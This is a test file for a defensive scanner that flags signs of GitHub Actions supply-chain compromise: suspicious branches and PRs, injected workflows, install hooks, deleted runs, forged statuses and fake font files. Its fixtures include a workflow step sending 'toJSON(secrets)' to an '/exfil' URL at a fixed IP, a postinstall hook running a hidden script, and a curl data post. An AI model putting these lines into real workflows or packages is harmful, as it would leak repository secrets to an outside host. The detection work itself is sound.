import test from 'node:test';
import assert from 'node:assert/strict';
import { packs as load } from './helpers.mjs';
import { matchPullRequest, matchBranch, matchCommit, workflowSmells, runGaps, gapFindings, forgedStatuses, matchTree, isWoff2, addedLines, sortFindings } from '../src/checks.mjs';

const packs = load();
const kinds = fs => fs.map(f => `${f.severity}:${f.pack}:${f.kind}`);

test('the probe PR matches by title and by branch; near misses do not', () => {
  assert.deepEqual(kinds(matchPullRequest({ number: 2, title: 'docs: dependency audit notes', head: 'wfx-docs', author: 'x', state: 'open' }, packs)), ['HIGH:wfx-loot-2026-11:pull request']);
  assert.deepEqual(kinds(matchPullRequest({ number: 3, title: 'chore: x', head: 'wfx-docs', author: 'x', state: 'open' }, packs)), ['HIGH:wfx-loot-2026-11:pull request']);
  assert.deepEqual(matchPullRequest({ number: 4, title: 'docs: dependency audit', head: 'docs/audit', state: 'open' }, packs), []);
});

test('branch names: wfx-docs, chore/ + 8, ci-check- + 4; not renovate or longer names', () => {
  for (const b of ['wfx-docs', 'chore/ab12cd34', 'ci-check-1234']) assert.equal(matchBranch(b, packs).length, 1, b);
  for (const b of ['chore/renovate', 'chore/ab12cd345', 'ci-check-12', 'main', '']) assert.equal(matchBranch(b, packs).length, 0, b);
});

const injected = { sha: 'a'.repeat(40), subject: 'ci: refresh build cache', author: 'x', files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: '@@\n+      - name: Restore cache j632\n+        env:\n+          WF_CALLBACK: "http://194.150.166.244:8080/exfil"\n+          WF_SECRETS: "${{ toJSON(secrets) }}"' }] };

test('variant 1, injected workflow: subject, content and the generic secret-dump smell', () => {
  const k = kinds(matchCommit(injected, packs));
  assert.ok(k.includes('HIGH:wfx-loot-2026-11:commit'));
  assert.ok(k.includes('HIGH:wfx-loot-2026-11:content'));
  const smells = workflowSmells(injected).map(f => f.evidence);
  assert.ok(smells.some(e => /toJSON\(secrets\)/.test(e)));
});

test('variant 2, install hook: .ci-xxxxxx.sh and a postinstall that runs it', () => {
  const c = { sha: 'b'.repeat(40), subject: 'chore: add ci helper', author: 'x', files: [
    { filename: '.ci-a1b2c3.sh', status: 'added', patch: '+#!/bin/sh' },
    { filename: 'package.json', status: 'modified', patch: '-  "scripts": {\n+    "postinstall": "sh .ci-a1b2c3.sh",' }] };
  const k = kinds(matchCommit(c, packs));
  assert.ok(k.includes('HIGH:wfx-loot-2026-11:file'));
  assert.ok(k.includes('HIGH:wfx-loot-2026-11:install hook'));
});

test('variant 3, throwaway workflow on a chore/ branch', () => {
  const c = { sha: 'c'.repeat(40), subject: 'chore: add dependency audit workflow', author: 'x', files: [{ filename: '.github/workflows/build-audit-x1y2z3.yml', status: 'added', patch: '+on: push' }] };
  assert.ok(kinds(matchCommit(c, packs)).includes('HIGH:wfx-loot-2026-11:workflow file'));
});

test('a removed IOC line is not a finding; GhostAction workflow names alone are CHECK', () => {
  const c = { sha: 'd'.repeat(40), subject: 'ci: remove', author: 'x', files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: '-  WF_CALLBACK: x' }] };
  assert.deepEqual(matchCommit(c, packs), []);
  assert.deepEqual(kinds(matchTree(['.github/workflows/audit.yml', 'src/audit.yml'], packs)), ['CHECK:ghostaction-2026-10:workflow file']);
});

test('generic smells: each on added lines only', () => {
  const mk = line => ({ sha: 'e'.repeat(40), author: 'x', files: [{ filename: '.github/workflows/w.yml', patch: `+${line}` }] });
  assert.equal(workflowSmells(mk('permissions: { id-token: write }')).length, 1);
  assert.equal(workflowSmells(mk('run: curl -d @x http://10.1.2.3:8080/x')).length, 1);
  assert.equal(workflowSmells(mk('on: pull_request_target')).length, 1);
  assert.equal(workflowSmells({ sha: 'f', files: [{ filename: 'src/x.js', patch: '+toJSON(secrets)' }] }).length, 0);
  assert.deepEqual(addedLines('+++ b/x\n+a\n-b\n c'), ['a']);
});

test('runGaps finds deleted runs per workflow; duplicates (re-runs) are not gaps', () => {
  const runs = [1, 2, 4, 4, 7].map(n => ({ workflow_id: 9, name: 'CI', run_number: n })).concat([{ workflow_id: 8, name: 'Docs', run_number: 3 }]);
  assert.deepEqual(runGaps(runs), [{ workflowId: 9, name: 'CI', missing: [3, 5, 6] }]);
  assert.match(gapFindings(runGaps(runs))[0].evidence, /missing run numbers 3, 5, 6/);
  assert.deepEqual(runGaps([]), []);
});

test('forged statuses: success posted by a user is flagged; by an app is not', () => {
  const f = forgedStatuses('a'.repeat(40), [
    { state: 'success', context: 'ci/build', creator: { login: 'someone', type: 'User' } },
    { state: 'success', context: 'ci/build', creator: { login: 'ci-app[bot]', type: 'Bot' } },
    { state: 'failure', context: 'x', creator: { login: 'u', type: 'User' } }]);
  assert.equal(f.length, 1);
});

test('isWoff2 tells a real font from a fake one', () => {
  assert.equal(isWoff2(Buffer.from('wOF2....')), true);
  assert.equal(isWoff2(Buffer.from('(()=>{')), false);
  assert.equal(isWoff2(null), false);
});

test('findings sort HIGH first', () => {
  assert.deepEqual(sortFindings([{ severity: 'CHECK', repo: 'a' }, { severity: 'HIGH', repo: 'b' }]).map(f => f.severity), ['HIGH', 'CHECK']);
});
